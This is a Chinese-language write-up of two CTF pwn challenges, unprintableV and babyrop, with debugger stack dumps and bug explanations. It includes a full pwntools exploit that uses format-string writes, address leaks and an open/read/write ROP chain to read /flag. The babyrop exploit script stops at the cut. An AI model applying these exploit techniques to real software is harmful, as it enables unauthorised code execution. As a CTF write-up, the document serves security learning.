感谢 Vidar-Team、L-Team、CNSS 带来的高质量比赛。
> Ru7n 师傅太强了，一路带飞
# pwn
## unprintableV
`pwnable.tw上`的`unprintable`魔改，第5版了。。我原先解pwnable.tw上这道题用的是把`bss`段上的`stdout`改成了`stderr`进行了泄露，这次这题也刚刚好用到了这个解法，不过这题禁用了`execve`,但是可以多次`printf`也不是什么大问题
一开始断点下在`printf(buf)`那里，栈的情况
    ► 0x55b7cd5bfa20    call   0x55b7cd5bf780
       0x55b7cd5bfa25    mov    eax, dword ptr [rip + 0x2015e5]
       0x55b7cd5bfa2b    sub    eax, 1
       0x55b7cd5bfa2e    mov    dword ptr [rip + 0x2015dc], eax
       0x55b7cd5bfa34    nop    
       0x55b7cd5bfa35    pop    rbp
       0x55b7cd5bfa36    ret    
       0x55b7cd5bfa37    push   rbp
       0x55b7cd5bfa38    mov    rbp, rsp
       0x55b7cd5bfa3b    mov    rax, qword ptr [rip + 0x2015de]
       0x55b7cd5bfa42    mov    ecx, 0
    ───────────────────────────────────[ STACK ]────────────────────────────────────
    00:0000│ rbp rsp  0x7ffcc627f8c0 —▸ 0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸ 0x55b7cd5bfb60 ◂— push   r15
    01:0008│          0x7ffcc627f8c8 —▸ 0x55b7cd5bfafb ◂— mov    edx, 6
    02:0010│          0x7ffcc627f8d0 ◂— 0x7fff000000000006
    03:0018│          0x7ffcc627f8d8 —▸ 0x55b7cd7c1060 ◂— '%216c%6$hhn'     //name
    04:0020│          0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸ 0x55b7cd5bfb60 ◂— push   r15
    05:0028│          0x7ffcc627f8e8 —▸ 0x55b7cd5bfb51 ◂— mov    eax, 0
    06:0030│          0x7ffcc627f8f0 —▸ 0x7ffcc627f9e8 —▸ 0x7ffcc62813cd ◂— './unprintableV'
    07:0038│          0x7ffcc627f8f8 ◂— 0x100000000
可以看到有两条这样的链`0x7ffcc627f8c0 —▸ 0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸
0x55b7cd5bfb60 ◂— push r15`,`0x7ffcc627f8f0 —▸ 0x7ffcc627f9e8 —▸
0x7ffcc62813cd ◂— './unprintableV'`,而且一开始还给了栈地址，完美啊
所以思路是先让`03:0018│ 0x7ffcc627f8d8 —▸ 0x55b7cd7c1060 ◂— '%216c%6$hhn'
//name`这里指向`bss`段上的`stdout`，然后把`stdout`改为`stderr`，看脸的时候到了，1/16的概率，注意下就是因为`close(1)`了，printf大于`0x2000`的字符数好像写不进去，所以爆破的时候用`p16(0x1680)`或者`p16(0x0680)`，成功的话`printf`就可以泄露啦，后面就随便玩了，:P
这次脸超级好，3次成功了两次，有点不太敢相信
exp为：
    from pwn import *
    context.arch='amd64'
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def main(host,port=10397):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./unprintableV")
            # p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
            # gdb.attach(p)
            debug(0x000000000000A20)
        p.recvuntil("gift: ")
        stack = int(p.recvuntil('\n',drop=True),16)
        info("stack : " + hex(stack))
        p.recvuntil("printf test!")
        payload = "%{}c%6$hhn".format(stack&0xff)
        p.send(payload)
        pause()
        payload = "%{}c%10$hhn".format(0x20)
        p.send(payload)
        pause()
        payload = "%{}c%9$hn".format(0x1680)
        p.send(payload)
        pause()
        payload = "+%p-%3$p*"
        p.send(payload.ljust(0x12c,"\x00"))
        p.recvuntil('+')
        elf_base = int(p.recvuntil('-',drop=True),16)+0x10
        info("elf : " + hex(elf_base))
        libc.address = int(p.recvuntil('*',drop=True),16)-0x110081
        success('libc : '+hex(libc.address))
        pause()
        ret_addr = stack-0x20
        payload = "%{}c%12$hn".format((stack-0x18)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        # offset = 43
        payload = "%{}c%43$hn".format((elf_base)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        payload = "%{}c%12$hn".format((stack-0x18+2)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        # offset = 43
        payload = "%{}c%43$hn".format((elf_base>>16)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        payload = "%{}c%12$hn".format((stack-0x18+4)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        # offset = 43
        payload = "%{}c%43$hn".format((elf_base>>32)&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        payload = "%{}c%12$hn".format(ret_addr&0xffff)
        p.send(payload.ljust(0x12c,"\x00"))
        # 0x0000000000000bbd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
        payload = "%{}c%43$hn".format((elf_base-0x202070+0xbbd)&0xffff)
        payload = payload.ljust(0x20,"\x00")
        payload += "/flag"+'\x00'*3
        # 0x00000000000a17e0: pop rdi; ret;
        # 0x0000000000023e6a: pop rsi; ret; 
        # 0x00000000001306d9: pop rdx; pop rsi; ret;
        p_rdi = libc.address+0x00000000000a17e0
        p_rsi = libc.address+0x0000000000023e6a
        p_rdx_rsi = libc.address+0x00000000001306d9
        rop = p64(p_rdi)+p64(elf_base+0x10)+p64(p_rsi)+p64(0)+p64(libc.symbols["open"])
        rop += p64(p_rdi)+p64(1)+p64(p_rdx_rsi)+p64(0x100)+p64(elf_base-0x70+0x300)+p64(libc.symbols["read"])
        rop += p64(p_rdi)+p64(2)+p64(p_rdx_rsi)+p64(0x100)+p64(elf_base-0x70+0x300)+p64(libc.symbols["write"])
        payload += rop
        p.send(payload)
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        # libc = ELF("./x64_libc.so.6",checksec=False)
        # elf = ELF("./unprintableV",checksec=False)
        main(args['REMOTE'])
## babyrop
题目有个简单的指令集，有个简单的栈结构(好像是这样
    00000000 stack           struc ; (sizeof=0x14, mappedto_6)
    00000000 rsp_            dq ?
    00000008 rbp_            dq ?
    00000010 len             dd ?
    00000014 stack           ends
然后就是指令集里有几个函数有`bug`
    case '(':
            ++*idx;
            if ( !(unsigned int)clear_stack(v7, v6) )// !!!
              exit(0);
            return result;
    case '4':
            ++*idx;
            sub_E17(v7);                            // !
            break;
    case '!':
            sub_BB9(v7);                            // !
            ++*idx;
            break;
思路是先两次`((`让结构体里的`rsp_`越界
    pwndbg> stack 30
    00:0000│ rsp  0x7ffef245fbe0 —▸ 0x558692b96148 ◂— 0x2
    01:0008│      0x7ffef245fbe8 —▸ 0x558692b96150 —▸ 0x7ffef245fca0 ◂— 0x11486eca0 !!!!
    02:0010│      0x7ffef245fbf0 —▸ 0x558692b96140 ◂— 0x2
    03:0018│      0x7ffef245fbf8 —▸ 0x558692b96040 ◂— 0x3400000000562828 /* '((V' */
    04:0020│      0x7ffef245fc00 ◂— 0x0
    ... ↓
    0e:0070│      0x7ffef245fc50 ◂— 0x100000100
    0f:0078│      0x7ffef245fc58 ◂— 0xe11547f75d191800
    10:0080│ rbp  0x7ffef245fc60 —▸ 0x7ffef245fc80 —▸ 0x558692995430 ◂— push   r15
    11:0088│      0x7ffef245fc68 —▸ 0x558692994977 ◂— mov    edi, 0
    12:0090│      0x7ffef245fc70 —▸ 0x7ffef245fd60 ◂— 0x1
    13:0098│      0x7ffef245fc78 ◂— 0xe11547f75d191800
    14:00a0│      0x7ffef245fc80 —▸ 0x558692995430 ◂— push   r15
    15:00a8│      0x7ffef245fc88 —▸ 0x7fb21429f830 (__libc_start_main+240) ◂— mov    edi, eax
    16:00b0│      0x7ffef245fc90 ◂— 0x1
    17:00b8│      0x7ffef245fc98 —▸ 0x7ffef245fd68 —▸ 0x7ffef246120c ◂— './babyrop'
    18:00c0│      0x7ffef245fca0 ◂— 0x11486eca0
两次`((`后：`01:0008│ 0x7ffef245fbe8 —▸ 0x558692b96150 —▸ 0x7ffef245fca0 ◂—
0x11486eca0 !!!!`，可以看到已经越界了
然后就是利用栈上的`0x7fb21429f830
(__libc_start_main+240)`和那几个有bug的函数进行加加减减，最后把返回地址给改为`one_gadget`
    ► 0x558692995428                     leave  
       0x558692995429                     ret    
        ↓
       0x7fb2142c426a     mov    rax, qword ptr [rip + 0x37ec47]
       0x7fb2142c4271     lea    rdi, [rip + 0x147adf]
exp为:
    from pwn import *
    context.arch='amd64'
    def debug(addr,PIE=True):
        if PIE: